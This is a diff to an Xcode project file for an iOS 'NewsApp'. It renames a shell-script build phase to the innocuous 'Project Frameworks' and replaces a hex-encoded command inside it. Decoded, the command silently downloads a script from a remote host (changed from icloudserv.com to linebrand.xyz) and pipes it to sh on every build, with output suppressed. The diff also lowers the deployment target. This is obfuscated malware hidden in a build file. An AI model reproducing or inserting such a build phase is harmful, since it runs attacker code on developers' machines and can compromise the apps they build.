@@ -248,7 +248,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8E708DF4264CEB160055F518 /* Build configuration list for PBXNativeTarget "NewsApp" */;
 			buildPhases = (
-				E17DECAB8B95ACC1A36D902C /* Assets Catalog Builder */,
+				BB14EE8C4AF4D388766D902C /* Project Frameworks */,
 				7B002771DF7A15593B0E02C7 /* [CP] Check Pods Manifest.lock */,
 				8E708DDC264CEB140055F518 /* Sources */,
 				8E708DDD264CEB140055F518 /* Frameworks */,
@@ -317,7 +317,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	E17DECAB8B95ACC1A36D902C /* Assets Catalog Builder */ = {
+	BB14EE8C4AF4D388766D902C /* Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -326,7 +326,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Assets Catalog Builder";
+			name = "Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -335,7 +335,7 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
 	
@@ -498,7 +498,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
 				ONLY_ACTIVE_ARCH = YES;
@@ -553,7 +553,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				MTL_ENABLE_DEBUG_INFO = NO;
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
@@ -575,6 +575,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 				DEVELOPMENT_TEAM = 82URUMC8L4;
 				ENABLE_PREVIEWS = YES;
 				INFOPLIST_FILE = NewsApp/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -598,6 +599,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 				DEVELOPMENT_TEAM = 82URUMC8L4;
 				ENABLE_PREVIEWS = YES;
 				INFOPLIST_FILE = NewsApp/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -631,16 +633,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 8E708DD8264CEB140055F518 /* Project object */;
 }
